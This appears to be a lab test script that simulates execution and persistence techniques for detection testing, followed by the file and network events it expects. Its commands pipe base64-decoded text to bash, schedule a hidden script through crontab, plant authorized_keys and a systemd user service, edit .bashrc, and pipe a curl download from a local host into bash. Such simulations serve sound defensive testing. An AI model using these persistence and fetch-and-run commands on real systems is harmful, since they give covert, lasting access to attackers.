# LIR-002: Execution and persistence (controlled lab run)
echo 'd2hvYW1pOyBob3N0bmFtZQ==' | base64 -d | bash
mkdir -p /tmp/lab-lynx/.upd
echo -e '#!/bin/bash\necho update-check' > /tmp/lab-lynx/.upd/run.sh
chmod +x /tmp/lab-lynx/.upd/run.sh
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/lab-lynx/.upd/run.sh") | crontab -
mkdir -p /tmp/lab-lynx/.ssh
echo "# lab test key marker" > /tmp/lab-lynx/.ssh/authorized_keys
mkdir -p /tmp/lab-lynx/.config/systemd/user
echo "[Unit]" > /tmp/lab-lynx/.config/systemd/user/updcheck.service
echo "ExecStart=/tmp/lab-lynx/.upd/run.sh" >> /tmp/lab-lynx/.config/systemd/user/updcheck.service
echo "export LAB_MARK=1" >> /tmp/lab-lynx/.bashrc
curl -s http://127.0.0.1:8099/setup.sh | bash
FILE:/tmp/lab-lynx/.ssh/authorized_keys:creation
FILE:/tmp/lab-lynx/.config/systemd/user/updcheck.service:creation
FILE:/tmp/lab-lynx/.bashrc:modification
FILE:/tmp/lab-lynx/.upd/run.sh:creation
NET:127.0.0.1:0:127.0.0.1:8099:curl
